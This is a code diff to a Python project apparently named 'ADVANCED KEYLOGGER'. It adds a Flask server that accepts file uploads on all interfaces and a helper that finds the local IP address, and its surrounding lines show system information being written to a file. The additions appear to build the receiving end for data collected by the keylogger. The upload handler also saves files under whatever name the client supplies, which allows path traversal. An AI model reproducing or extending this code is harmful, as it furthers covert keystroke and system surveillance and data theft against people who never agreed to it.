@@ -4,6 +4,11 @@
 import socket
 import platform
 
+import multiprocessing
+
+# Library for web requests.
+from flask import Flask, request
+import requests
 # Library for system info & time.
 import time
 import os
@@ -49,6 +54,43 @@ number_of_iterations_end = 5
 file_path = "C:\\Users\\MSI PC\\Desktop\\ADVANCED KEYLOGGER\\project"
 extend = "\\"
 file_merge = file_path + extend
+
+# Flask upload server Functionality
+def start_upload_server(upload_folder='uploads', host='0.0.0.0', port=5000):
+    app = Flask(__name__)
+    os
+    
+    @app.route('/upload', methods=['POST'])
+    def upload_file():
+        if 'file' not in request.files:
+            return "No file part in the request", 400
+        
+        file = request.files['file']
+        
+        if file.filename == '':
+            return "No selected file", 400
+        
+        file_path = os.path.join(upload_folder, file.filename)
+        file.save(file_path)
+        print(f"[SERVER] Received file: {file.filename}")
+        return f'File {file.filename} uploaded successfully', 200
+
+    print(f"[SERVER] Starting upload server at {host}:{port} with upload folder '{upload_folder}'")
+    app.run(host=host, port=port)
+
+# Local IP Address Functionality
+def get_local_ip():
+    s= socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect(('10.255.255.255', 1))
+        local_ip = s.getsockname()[0]
+    except Exception:
+        local_ip = '127.0.0.1'
+    finally:
+        s.close()
+    return local_ip
+
+
 
 def get_system_info():
     with open(file_path + extend + "sys_info.txt", "a") as f:
